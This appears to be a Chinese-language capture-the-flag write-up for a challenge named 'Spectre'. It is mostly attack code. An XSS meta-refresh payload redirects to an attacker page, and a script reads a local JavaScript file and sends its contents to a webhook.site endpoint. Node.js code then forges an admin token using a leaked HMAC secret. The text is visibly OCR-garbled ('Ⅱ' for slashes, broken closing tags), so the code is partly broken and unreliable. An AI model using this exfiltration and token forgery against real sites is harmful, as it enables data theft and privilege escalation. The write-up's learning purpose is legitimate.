---
tags: [XSS, 令牌窃取, JWT伪造, HMAC-SHA256, Node.js]
---

# Spectre

xss拿token_key

```
</code><meta  http-equiv="refresh"  content="0;
url='<http://192.168.136.1:7000/exp.html>'">
```

可以meta跳转， localhost:3001/share-view.dev.js没有同源限制， 可以拿key。 exp.html

```
< !DOCTYPE  html>
<html>
<head>
<title>testdtitle>
d head>
<body>
<script>
const  send_data  =  function(data){
var  x  =  new  XMLHttpRequest();
x.open('GET','<https:Ⅱwebhook.site/ce696bba-423c-42a8-9607-
304316761396/ ?data→ '  +  encodeURI(data) ,true) ;
x .send() ;
}

var  xhr  =  new  XMLHttpRequest();
xhr.open("GET",  "<http:Ⅱlocalhost:3001/share-view.dev.js>"); xhr .onreadystatechange  =  function  ()  {
try{
send_data(xhr .responseText) ;
}
catch(e ){
console .log(e ) ;
}
} ;
xhr .send() ;
d script>
d body>
d html>

```

token加密：

```
const  crypto  =  require('crypto ') ;

const  XOR_KETBUF  =  Buffer .from([0x11 ,  0x45 ,  0x14]) ;

function  tobase64(buf ,  removePadding  =  true)  {
return  Buffer .from(buf) .toString('base64 ') .replace(仨/g ,  ' ') ; }

function  frombase64(str)  {
return  Buffer .from(str ,  'base64 ') ; }

function  xorBuffer(databuf ,  keybuf)  {
let  res  =  Buffer .alloc(databuf .length) ;
for  (let  i  =  0 ;  i  <  databuf .length;  i 艹 )  {

res [i ]  =  databuf [i ]  ^  keybuf [i  %  keybuf .length] ;
}
return  res ;
}

function  sign(json ,  secret)  {
let  data_buf  =  Buffer .from(JSON .stringify(json)) ;
let  xor_buf  =  Buffer .from(XOR_KETBUF) ;
let  salt_buf  =  crypto .randomBytes(16) ;

let  hash  =  crypto .createHmac( 'sha256 ' ,  secret) ;
let  encdata  =  Buffer .concat([xorBuffer(Buffer .from(data_buf) ,  xor_buf) , salt_buf]) ;
hash .update(encdata) ;
let  sig_buf  =  hash .digest() ;
let  token  =  tobase64(data_buf)  +   ' . '  +
tobase64(Buffer .concat([xorBuffer(salt_buf ,  xor_buf) ,  sig_buf])) ;
return  token ;
}

function  verify(token ,  secret)  {
let  [enc_data ,  enc_p2]  =  token .split( ' . ') ;
let  data_buf  =  frombase64(enc_data) ;
let  p2_buf  =  frombase64(enc_p2) ;
let  hash_bytelen  =  32;
let  salt_buf  =  xorBuffer(p2_buf .subarray(0 ,  p2_buf .length  -  hash_bytelen) , XOR_KETBUF) ;
let  sig_buf  =  p2_buf .subarray(p2_buf .length  -  hash_bytelen) ;
let  hash  =  crypto .createHmac( 'sha256 ' ,  secret) ;
hash .update(Buffer .concat([xorBuffer(data_buf ,  XOR_KETBUF) ,  salt_buf])) ; let  expected_sig_buf  =  hash .digest() ;
if  (Buffer .compare(sig_buf ,  expected_sig_buf)  丰  0 )  {
return  null;
}  else  {
return  JSON .parse(data_buf) ;
}
}

token  =  sign({  uid :   'testas51d61 ' ,  role :   'admin '  } , 'bHYq6JwwfJ9CD2FW ') console .log(token)
console .log(verify(token , 'bHYq6JwwfJ9CD2FW '))
```

服务器需要[https](https)， 用webhook.site编辑个响应就行了

```
exp.html:1  Access  to  XMLHttpRequest  at  '<http:Ⅱlocalhost:3001/share -
view.dev.js>'  from  origin   '<http:Ⅱserver 入ip'  has  been  blocked  by  CORS
policy :  The  request  client  is  not  a  secure  context  and  the  resource  is  in more-private  address  space  `local` .
```

